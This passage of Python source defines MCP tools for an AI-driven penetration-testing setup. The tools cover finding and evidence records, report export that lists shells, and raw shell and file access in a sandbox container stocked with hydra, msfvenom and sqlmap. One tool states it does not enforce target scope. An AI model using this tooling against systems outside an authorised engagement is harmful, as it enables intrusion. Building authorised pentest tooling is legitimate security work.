    engagement_id: str | None = None,
) -> dict[str, Any]:
    """Record a finding. severity: info | low | medium | high | critical.
    Pair with evidence_attach to associate raw output / screenshots / commands."""
    try:
        eid = require_engagement(engagement_id)
    except ScopeError as e:
        return _err(str(e))
    if severity not in {"info", "low", "medium", "high", "critical"}:
        return _err(f"severity must be info|low|medium|high|critical, got {severity!r}")
    return state.add_finding(eid, severity, title, description, target or None)


@mcp.tool()
def finding_list(severity: str | None = None, engagement_id: str | None = None) -> dict[str, Any]:
    """List findings for the engagement, optionally filtered by severity."""
    start = time.monotonic()
    try:
        eid = require_engagement(engagement_id)
        return {
            "engagement_id": eid,
            "findings": state.list_findings(eid, severity=severity),
            "duration_ms": _duration(start),
        }
    except ScopeError as e:
        return _err(str(e))


@mcp.tool()
def evidence_attach(finding_id: str, content: str, kind: str = "text") -> dict[str, Any]:
    """Attach evidence to a finding. kind: text | command_output | screenshot_path | url.
    content is the raw evidence body (paste the nmap/sqlmap/curl output here)."""
    try:
        return state.attach_evidence(finding_id, kind, content)
    except ValueError as e:
        return _err(str(e))


@mcp.tool()
def report_export(format: str = "markdown", engagement_id: str | None = None) -> dict[str, Any]:
    """Export the engagement as a report. format: markdown | json."""
    try:
        eid = require_engagement(engagement_id)
    except ScopeError as e:
        return _err(str(e))
    eng = state.get_engagement(eid)
    findings = state.list_findings(eid)
    for f in findings:
        f["evidence"] = state.list_evidence(f["id"])
    shells = state.list_shells(eid, include_dead=True)
    if format == "json":
        return {"engagement": eng, "findings": findings, "shells": shells}
    lines = [
        f"# Pentest Report — {eng['name']}",
        "",
        f"- Engagement ID: `{eng['id']}`",
        f"- Status: {eng['status']}",
        f"- Created: {eng['created_at']}",
        f"- Closed: {eng.get('closed_at') or '—'}",
        f"- Authorization: {eng.get('authorization_note') or '—'}",
        "",
        "## Scope",
    ]
    for s in eng["scope"]:
        prefix = "EXCLUDE " if s["is_excluded"] else "ALLOW   "
        lines.append(f"- {prefix}{s['target']}")
    by_sev: dict[str, list[dict[str, Any]]] = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
    for f in findings:
        by_sev.setdefault(f["severity"], []).append(f)
    lines += ["", "## Findings"]
    for sev in ["critical", "high", "medium", "low", "info"]:
        items = by_sev.get(sev) or []
        if not items:
            continue
        lines.append(f"\n### {sev.upper()} ({len(items)})\n")
        for f in items:
            lines.append(f"#### {f['title']}")
            lines.append(f"- Target: `{f.get('target') or '—'}`")
            lines.append(f"- Recorded: {f['created_at']}")
            if f.get("description"):
                lines.append(f"\n{f['description']}\n")
            for e in f.get("evidence", []):
                lines.append(f"\n**Evidence ({e['kind']}):**\n\n```\n{e['content']}\n```")
            lines.append("")
    if shells:
        lines.append("\n## Shells")
        for s in shells:
            lines.append(f"- `{s['id']}` {s['shell_type']} on {s['target']} — {s['status']} — {s.get('notes') or ''}")
    return {"engagement_id": eid, "format": format, "report": "\n".join(lines)}


# ============================================================================
# CONTAINER ESCAPE HATCH
# ============================================================================


@mcp.tool()
def container_exec(
    command: str,
    workdir: str = "/",
    timeout: int = 90,
    encoding: str = "text",
    max_stdout_bytes: int = 200_000,
    max_stderr_bytes: int = 100_000,
) -> dict[str, Any]:
    """Raw shell command inside the PentAGI sandbox container. Use this when no
    higher-level tool fits — installing a package, running an obscure binary, etc.
    Does NOT enforce scope (use scope_check first if it touches a target).

    encoding:
        "text"   — default; bytes decoded with errors='replace'. Safe for binary output.
        "base64" — stdout is base64-encoded inside the container before returning;
                   use when you need pristine bytes (binary file dump, tarball, etc.).
    max_stdout_bytes / max_stderr_bytes: truncation caps; metadata flags whether truncation happened."""
    if encoding not in {"text", "base64"}:
        return _err("encoding must be 'text' or 'base64'")
    if encoding == "base64":
        wrapped = f"({command}) | head -c {int(max_stdout_bytes) * 3 // 4} | base64 -w 0"
        r = docker_exec(wrapped, timeout=timeout, workdir=workdir)
        return {
            **r.as_dict(),
            "encoding": "base64",
            "max_stdout_bytes": max_stdout_bytes,
            "max_stderr_bytes": max_stderr_bytes,
        }
    r = docker_exec(command, timeout=timeout, workdir=workdir)
    stdout_truncated = len(r.stdout) > max_stdout_bytes
    stderr_truncated = len(r.stderr) > max_stderr_bytes
    return {
        **r.as_dict(),
        "stdout": r.stdout[:max_stdout_bytes],
        "stderr": r.stderr[:max_stderr_bytes],
        "encoding": "text",
        "stdout_truncated": stdout_truncated,
        "stderr_truncated": stderr_truncated,
        "max_stdout_bytes": max_stdout_bytes,
        "max_stderr_bytes": max_stderr_bytes,
        "binary_detected": r.stdout_binary_replaced or r.stderr_binary_replaced,
    }


@mcp.tool()
def container_file_read(path: str, max_bytes: int = 100_000) -> dict[str, Any]:
    """Read a file from the sandbox container (output of a recent scan, etc.).
    Truncates to `max_bytes`."""
    cmd = f"head -c {int(max_bytes)} {shlex.quote(path)}"
    r = docker_exec(cmd, timeout=60)
    return {
        "path": path,
        "content": r.stdout,
        "returncode": r.returncode,
        "stderr": r.stderr,
        "container": CONTAINER,
        "binary_detected": r.stdout_binary_replaced,
        "truncated_at_bytes": max_bytes,
    }


@mcp.tool()
def container_file_write(path: str, content: str, append: bool = False) -> dict[str, Any]:
    """Write `content` to `path` inside the container (e.g. drop a custom payload,
    a wordlist, a target list). Uses base64 so content is written exactly —
    no heredoc-added trailing newline."""
    op = ">>" if append else ">"
    encoded = base64.b64encode(content.encode()).decode()
    cmd = f"printf %s {shlex.quote(encoded)} | base64 -d {op} {shlex.quote(path)}"
    return docker_exec(cmd, timeout=60).as_dict()


@mcp.tool()
def container_info() -> dict[str, Any]:
    """Inspect the sandbox container: hostname, OS, common pentest tool availability.
    Run this once at the start of a session to confirm everything's wired up."""
    cmd = (
        "echo '=== uname ==='; uname -a; "
        "echo '=== /etc/os-release ==='; cat /etc/os-release 2>/dev/null || true; "
        "echo '=== tools ==='; "
        "for t in nmap sqlmap hydra msfconsole msfvenom searchsploit nuclei feroxbuster "
        "gobuster amass subfinder theHarvester whois dig curl jq; do "
        '  if command -v $t >/dev/null; then echo "OK   $t -> $(command -v $t)"; '
        '  else echo "MISS $t"; fi; '
        "done"
    )
    return docker_exec(cmd, timeout=30).as_dict()
